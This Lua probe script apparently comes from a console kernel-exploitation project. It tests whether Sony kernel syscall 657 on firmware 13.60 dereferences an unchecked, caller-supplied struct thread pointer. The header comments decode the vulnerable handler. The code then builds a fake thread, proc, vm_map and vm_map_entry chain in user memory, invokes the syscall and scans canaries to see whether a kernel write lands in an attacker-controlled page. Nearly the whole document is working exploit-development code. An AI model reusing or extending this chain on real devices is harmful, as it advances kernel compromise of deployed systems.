-- CRASH_CLASS: MODERATE -- one call that can fault the kernel; empirically a kernel-mode fault in a
-- Sony handler kills the loader process and leaves the console running (1394a, 1400a, 1497a).
-- PROBE 1500a: 657 trusts its third argument as a struct thread pointer.
--
-- Static decode of 657 (blockpool_batch, 13.60 body 0xffffffff8b369f40):
--   rbx = uap[0]                     ; entry array, copyin 0x20 bytes per entry
--   r13 = (signed)uap[1]             ; count;  0 -> skip,  negative -> skip
--   rdi = uap[2]                     ; *** no user range check ***
--   cmp dword [uap+0x18], 0 ; je     ; arg3 must be 0 for this path
--   test rdi,rdi ; je epilogue
--   mov rax, [rdi + 8]               ; <-- raw kernel deref of a caller supplied value
--   mov r14, [rax + 0x200]           ; <-- and the result is dereferenced again
--   ... r14 is then used as a vm_map:
--   vm_map_lock(r14,0,0)
--   vm_map_lookup_entry(r14, entry[+8], &ent)
--   lock add dword [r14 + 0x1c4], 1
-- So uap[2] is expected to be a struct thread*, [td+8] a struct proc*, [proc+0x200] the vm_map.
-- Nothing checks any of those three levels, so a caller supplied value decides a kernel pointer.
--
-- vm_map_lookup_entry short circuit: it reads the cached hint at [map+0x1d0] first and returns 1
-- without walking the map if [hint+0x20] <= addr < [hint+0x28], so a fake map needs only that hint and
-- one fake entry. The entry must have +0x60 bit 2 clear, a non NULL +0x50 object, and [obj+0x9d] == 0xb.
--
-- What this measures: whether the kernel can read our user pages at all in this path (SMAP). If it
-- can, the increment of [fake_map+0x1c4] lands in our page and proves it; if SMAP is on, the first
-- deref faults and the process dies, which is the answer too.
--
-- [A] build four pages: thread -> proc -> map -> entry, with canaries everywhere
-- [B] control: 657(entries, 0, fake_thread, 0), which must skip the deref and return
-- [C] 657(entries, 1, fake_thread, 0)   <-- the one call; everything is printed before it
-- [D] canary scan: did [map+0x1c4] increment, did anything else change
--
-- -- prior art:
--   docs/DEAD_ENDS.md (blockpool_batch returns status dword 0 only, still writes after close)
--   results/phase36_realargs/1465a_blockpool_open_flags_20261109_175825.txt (653 gives a handle)
--   results/phase36_realargs/1484a_blockpool_mapping_20261109_203703.txt (653 creates no mapping)
--   results/phase35_dead_end_reruns/1400a_sys601_cmd11_struct_20261109_144119.txt (kernel NULL deref kills the process, console survives)

print("=== PROBE 1500a: 657 TREATS ARG2 AS A STRUCT THREAD POINTER ===")

local function N(v) if type(v) == "table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function es() local ok,s = pcall(function() return get_error_string() end) if ok and type(s)=="string" then return s end return "errno?" end
local function sgn(v)
    local h, l = 0, N(v)
    if type(v) == "table" and v.h then h, l = N(v.h), N(v.l) end
    if (h % 4294967296) == 4294967295 and (l % 4294967296) == 4294967295 then return -1 end
    if h >= 0xFFFF8000 then return -1 end
    return h * 4294967296 + l
end
local function dw(a) return N(memory.read_dword(a)) end
local function wd(a, v) pcall(function() memory.write_dword(a, uint64(v % 4294967296)) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, uint64(string.format("0x%X", v))) end) end
local function wb(a, v) pcall(function() memory.write_byte(a, v % 256) end) end

local PID = N(mk(20)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("[0] pid=%d", PID))

local sa = memory.alloc(0x80)
for i = 0, 0x60, 8 do pcall(function() memory.write_qword(sa + i, uint64(0)) end) end
pcall(function() memory.write_qword(sa, uint64(1)) end)
for _, s in ipairs({5, 6, 7, 8, 12, 24, 25, 26, 30, 31}) do
    pcall(function() return mk(416)(uint64(s), uint64(sa), uint64(0)) end)
end

local function amap(n)
    local ok, v = pcall(function()
        return mk(477)(uint64(0), uint64(n), uint64(3), uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    end)
    if not ok then return -1 end
    return sgn(v)
end

-- ---------------------------------------------------------------- [A]
print("")
print("--- [A] building the fake chain ---")
local E = amap(0x4000)   -- entry array (the real argument)
local T = amap(0x4000)   -- fake struct thread
local P = amap(0x4000)   -- fake struct proc
local M = amap(0x4000)   -- fake vm_map
local EN = amap(0x4000)  -- fake vm_map_entry
local CANARY = 0x5A5A5A5A
for _, pg in ipairs({E, T, P, M, EN}) do
    if pg < 0x10000 then
        print("  mmap failed; stopping")
        print("=== PROBE 1500a INCOMPLETE ===")
        return
    end
    for i = 0, 0x3FFF, 4 do wd(pg + i, CANARY) end
end
print(string.format("  E 0x%X", E))
print(string.format("  T 0x%X  P 0x%X  M 0x%X  EN 0x%X", T, P, M, EN))

-- entry array: {op 1 at +0x00, lookup address at +0x08}
wd(E + 0x00, 1)
wq(E + 0x08, 0x1000)

-- thread -> proc -> map
wq(T + 0x08, P)
wq(P + 0x200, M)

-- fake vm_map
wq(M + 0x20, 0)
wq(M + 0x28, 0x7FFFFFFFFFFF)
wb(M + 0x244, 0)          -- no bit 0x10, no bit 8: plain rwlock at +0x170
wq(M + 0x1d0, EN)         -- cached hint, this is what short circuits the lookup
wd(M + 0x1c4, 0)          -- the increment target, 0 so a landing is unambiguous

-- fake vm_map_entry
wq(EN + 0x20, 0)          -- start
wq(EN + 0x28, 0x10000)    -- end, so 0x1000 is inside
wq(EN + 0x50, EN + 0x100) -- object pointer, into our own page
wb(EN + 0x60, 0)          -- bit 2 clear
wb(EN + 0x100 + 0x9d, 0xb) -- fake vm_object type 11

print(string.format("  T[+8]=0x%X  P[+0x200]=0x%X  M[+0x1d0]=0x%X  M[+0x1c4]=%d",
    dw(T + 8) + dw(T + 12) * 4294967296, 0, dw(M + 0x1d0), dw(M + 0x1c4)))

-- ---------------------------------------------------------------- [B] control
print("")
print("--- [B] control: count 0 must skip the deref ---")
local ok0, rv0 = pcall(function()
    return N(mk(657)(uint64(E), uint64(0), uint64(T), uint64(0), uint64(0), uint64(0)))
end)
print(string.format("  657(E, 0, T, 0) -> ok=%s rv=%s", tostring(ok0), ok0 and tostring(rv0) or "EXC"))

-- ---------------------------------------------------------------- [C] the call
print("")
print("--- [C] 657(E, 1, fake_thread, 0) ---")
print("  (if the capture ends here, the kernel faulted on our pointer)")
local ok, rv = pcall(function()
    return N(mk(657)(uint64(E), uint64(1), uint64(T), uint64(0), uint64(0), uint64(0)))
end)
print(string.format("  returned: ok=%s rv=%s %s", tostring(ok), ok and tostring(rv) or "EXC",
    (ok and rv == -1) and es() or ""))

-- ---------------------------------------------------------------- [D]
print("")
print("--- [D] canary scan ---")
print(string.format("  M[+0x1c4] = %d   %s", dw(M + 0x1c4),
    (dw(M + 0x1c4) ~= 0 and dw(M + 0x1c4) ~= CANARY) and "*** THE INCREMENT LANDED IN OUR PAGE ***" or ""))
local function scan(name, pg)
    local changed, first = 0, -1
    for i = 0, 0x3FFF, 4 do
        local v = dw(pg + i)
        if v ~= CANARY then
            changed = changed + 1
            if first < 0 then first = i end
        end
    end
    print(string.format("  %-3s changed %4d dwords%s", name, changed,
        first >= 0 and string.format(" (first +0x%X = %08X)", first, dw(pg + first)) or ""))
    return changed
end
scan("E", E); scan("T", T); scan("P", P); scan("M", M); scan("EN", EN)
local final = N(mk(20)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("  final canary live: %s (pid %d)", tostring(final == PID), PID))
print("=== PROBE 1500a COMPLETE ===")
